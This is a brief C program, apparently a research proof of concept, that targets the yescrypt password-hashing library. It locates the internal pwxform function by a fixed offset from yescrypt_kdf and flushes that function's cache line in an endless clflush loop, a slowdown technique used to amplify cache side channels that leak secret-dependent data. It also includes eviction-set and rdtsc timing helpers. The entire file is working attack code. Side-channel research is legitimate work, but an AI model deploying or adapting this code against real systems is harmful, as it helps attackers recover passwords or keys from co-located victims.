#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include "constants.h"


void clflush(uint64_t addr)
{
    asm volatile ("clflush (%0)"::"r"(addr));
}

static inline void wait_cycles(uint64_t cycles){
    uint32_t start, end;
    __asm__ volatile(
        "rdtsc\n\t"
        : "=a"(start));

    do {
        __asm__ volatile(
            "rdtsc\n\t"
            : "=a"(end));
    }while (end-start < cycles);
}

static inline void mfence() {
    asm volatile("mfence");
}

void get_eviction_set(void *buf, void **eviction_set, uint64_t set) {

    for (int i=0; i<L3_ASSOC; i++){
        eviction_set[i] = (void *) ((uint64_t)buf + (uint64_t)(i<<16) + (uint64_t)(set<<6));
    }
    
}

int main() {
    uint32_t t;
    void *handle_libyescrypt = dlopen("./libyescrypt-ref.so", RTLD_LAZY);
    void (*yescrypt_kdf)() = dlsym(handle_libyescrypt, "yescrypt_kdf");

    //pay attention on portion of code inside the cache line, if you want less slowdown flush 0x10(?) byte down
    void (*pwxform)() = yescrypt_kdf - 0x14ed; 
    
    do {
        mfence();
        clflush((uint64_t) pwxform);
        //clflush((uint64_t) pwxform);
        //mfence();
        //wait_cycles(500);
    } while (1);
    
    return 0;
}
